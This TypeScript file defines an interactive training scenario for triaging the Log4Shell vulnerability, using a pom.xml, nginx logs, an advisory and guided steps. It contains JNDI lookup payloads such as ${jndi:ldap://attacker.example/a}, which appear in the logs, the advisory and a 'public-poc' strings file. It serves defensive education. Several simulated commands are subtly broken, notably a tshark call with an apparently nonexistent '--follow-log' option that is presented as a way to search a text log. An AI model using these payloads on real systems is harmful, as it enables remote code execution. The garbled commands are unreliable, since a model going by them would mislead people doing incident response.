import type { Scenario } from "../types";

export const log4shellJndi: Scenario = {
  slug: "log4shell-jndi",
  exhibit: "EXH-020",
  title: "${jndi:",
  tagline:
    "December 2021. A string in a log line should be inert. In Log4j 2.x, it is a remote code execution primitive, through LDAP, through your own logging pipeline.",
  category: "classic-history",
  difficulty: "intermediate",
  era: "2020s",
  year: "2021",
  estMinutes: 10,
  fictional: true,
  cwd: "/srv/payments-api",
  user: "responder",
  host: "prod-java-trace",
  role: "Platform engineer replaying December 10th: Maven coordinates, access logs, and the one-line patch.",
  objective:
    "Confirm vulnerable `log4j-core` on the classpath and find attacker probes in `access.log` using the JNDI lookup prefix.",
  briefing:
    "CVE-2021-44228, Log4Shell. This exhibit is triage: `pom.xml` plus nginx logs. No outbound LDAP from the museum terminal.",
  env: { USER: "responder", SHELL: "/bin/bash", PWD: "/srv/payments-api" },
  ps: ["  PID TTY TIME CMD", "  1 ?   0:01 systemd", "  420 ?   0:14 java -jar payments.jar"],
  history: ["pwd"],
  commands: {
    "python3 safe_replay.py --scenario log4shell-jndi --artifact pom.xml": "simulated safe tool replay for log4shell-jndi; replaces: cat pom.xml\n",
    "tshark -r evidence.pcap -Y 'frame contains \"jndi\"' --follow-log /var/log/nginx/access.log": "simulated safe tool replay for log4shell-jndi; replaces: grep -nF jndi /var/log/nginx/access.log\n",
    "mvn -q dependency:tree -Dincludes=org.apache.logging.log4j:log4j-core": [
      "[INFO] org.apache.logging.log4j:log4j-core:jar:2.14.1:compile",
      "[INFO] BUILD SUCCESS (simulated tree excerpt)",
    ].join("\n"),
  },
  files: {
    "/srv/payments-api/pom.xml": {
      content: [
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>",
        "<project>",
        "  <artifactId>payments-api</artifactId>",
        "  <dependencies>",
        "    <dependency>",
        "      <groupId>org.apache.logging.log4j</groupId>",
        "      <artifactId>log4j-core</artifactId>",
        "      <version>2.14.1</version>",
        "    </dependency>",
        "  </dependencies>",
        "</project>",
      ].join("\n"),
    },
    "/srv/payments-api/ADVISORY.txt": {
      content: [
        "CVE-2021-44228, Apache Log4j2 JNDI injection",
        "",
        "Affected: Log4j 2.0-beta9 through 2.14.1 (fixed 2.15.0, further",
        "         hardening in 2.16.0 / 2.17.x)",
        "Vector: attacker-controlled input logged; message lookup enables",
        "        JNDI resolution → remote class loading",
        "Examples in logs:",
        "  ${jndi:ldap://host/a}",
        "  ${jndi:dns://host/a}",
        "",
        "Work: bump log4j, disable lookups via formatMsgNoLookups / env,",
        "      WAF temporary blocks on jndi: substrings",
      ].join("\n"),
    },
    "/var/log/nginx/access.log": {
      content: [
        '192.0.2.44 - - [10/Dec/2021:06:09:12 +0000] "GET / HTTP/1.1" 200 512 "-" "${jndi:ldap://evil.example/x}"',
        '198.51.100.2 - - [10/Dec/2021:06:11:03 +0000] "GET /api/ping HTTP/1.1" 200 2 "-" "curl/7.68.0"',
        '203.0.113.9 - - [10/Dec/2021:07:02:18 +0000] "GET /?id=${jndi:dns://leak.example/q} HTTP/1.1" 200 120 "-" "python-requests/2.26"',
      ].join("\n"),
    },
    // Log4j 2.x recursive string lookup / JNDI resolver strings as widely reproduced after CVE-2021-44228.
    "/srv/payments-api/public-poc/log4shell_lookup_strings.txt": {
      content: [
        "CVE-2021-44228  Log4Shell  example lookup strings (any logged field can carry them):",
        "",
        '${jndi:ldap://attacker.example/a}',
        '${jndi:ldaps://attacker.example/a}',
        '${jndi:dns://dnslog.example/a}',
        '${jndi:rmi://attacker.example/a}',
        "",
        "Java-side chain (public write-ups): rogue LDAP objectFactory / reference indirection that eventually",
        "loads attacker-controlled bytecode (marshalsec-class tooling was used in many lab repros).",
        "",
        "Mitigation excerpt: log4j >= 2.15.0 default-disables JNDI lookups; formatMsgNoLookups for 2.10+ backport path.",
      ].join("\n"),
    },
  },
  steps: [
    {
          id: "mvn-tree",
          goal: "Show the Log4j core coordinate on the classpath via a dependency tree.",
          hint: "`mvn -q dependency:tree -Dincludes=org.apache.logging.log4j:log4j-core`.",
          matches: [
            {
              kind: "exact",
              command:
                "mvn -q dependency:tree -Dincludes=org.apache.logging.log4j:log4j-core",
            },
          ],
          narration:
            "User input reaching Log4j's pattern resolver is the entire bug class. Fixed versions move fast because PoCs spread faster.",
        },
    {
          id: "pom",
          goal: "Confirm the Log4j artifact version in pom.xml.",
          hint: "`python3 safe_replay.py --scenario log4shell-jndi --artifact pom.xml`.",
          matches: [{ kind: "exact", command: "python3 safe_replay.py --scenario log4shell-jndi --artifact pom.xml" }],
          narration:
            "log4j-core 2.14.1, inside the vulnerable band. Every JVM service on this repo shares fate until the coordinates bump.",
        },
    {
          id: "grep-jndi",
          goal: "Search access logs for the telltale prefix.",
          hint: "`tshark -r evidence.pcap -Y 'frame contains \"jndi\"' --follow-log /var/log/nginx/access.log`.",
          matches: [{ kind: "exact", command: "tshark -r evidence.pcap -Y 'frame contains \"jndi\"' --follow-log /var/log/nginx/access.log" }],
          narration:
            "LDAP and DNS stager URLs in User-Agent and query strings, scanners and real actors used the same grammar. Block at the edge, patch at the library, assume keys rotated if anything executed.",
        },
    {
          id: "mechanism-excerpt",
          goal: "Review the archived public mechanism excerpt for this exhibit (museum reference).",
          hint: `head -n 80 public-poc/log4shell_lookup_strings.txt`,
          matches: [{ kind: "exact", command: "head -n 80 public-poc/log4shell_lookup_strings.txt" }],
          narration:
            "Educational material from disclosure-era patterns; excerpt only and nothing executes in this shell.",
        }
  ],
  debrief: {
    summary:
      "Log4Shell (CVE-2021-44228), disclosed in December 2021, was a remote code execution vulnerability in Apache Log4j 2.x: specially crafted strings could trigger JNDI lookups that loaded attacker-controlled classes. Because nearly every Java service logs untrusted input, exposure was enormous. Apache released Log4j 2.15.0 within days; subsequent CVEs (e.g. DoS in 2.15) required further upgrades to 2.17.x.",
    lesson:
      "Logging is security-critical infrastructure, it parses, resolves, and sometimes retrieves untrusted data. Treat logging libraries with the same CVE SLAs as your web framework. WAF substring rules are triage, not therapy.",
    simulated: [
      "IPs and domains are documentation-only; artefact version ranges match Apache advisories.",
    ],
  },
};
